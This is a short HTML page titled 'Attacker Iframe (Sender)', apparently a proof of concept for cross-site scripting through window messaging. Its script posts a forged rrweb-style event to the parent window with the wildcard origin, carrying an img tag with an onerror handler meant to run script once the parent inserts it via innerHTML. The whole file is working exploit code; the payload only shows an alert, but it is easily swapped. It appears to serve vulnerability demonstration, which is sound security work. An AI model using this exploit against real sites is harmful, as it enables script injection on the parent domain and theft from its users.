<!DOCTYPE html>
<html>
<head>
    <title>Attacker Iframe (Sender)</title>
</head>
<body>
    <h2>Iframe Window</h2>
    <p>Attempting to send a malicious message to the parent...</p>

    <script>
        // The malicious payload containing the XSS vector
        const maliciousPayload = {
            type: "rrweb",
            event: {
                data: {
                    // This payload, when unsafely inserted via innerHTML, runs JS.
                    text: "<h1>Hacked!</h1><img src=x onerror=alert('XSS executed on parent domain!')>"
                }
            },
            origin: window.location.origin,
            isCheckout: false
        };

        // Send the malicious message to the parent with the wildcard origin ("*")
        if (window.parent !== window) {
            window.parent.postMessage(maliciousPayload, "*");
            document.body.innerHTML += "<p style='color: green;'>Malicious message sent to parent!</p>";
        } else {
            document.body.innerHTML += "<p style='color: red;'>Not running in an iframe. Cannot send message.</p>";
        }
    </script>
</body>
</html>
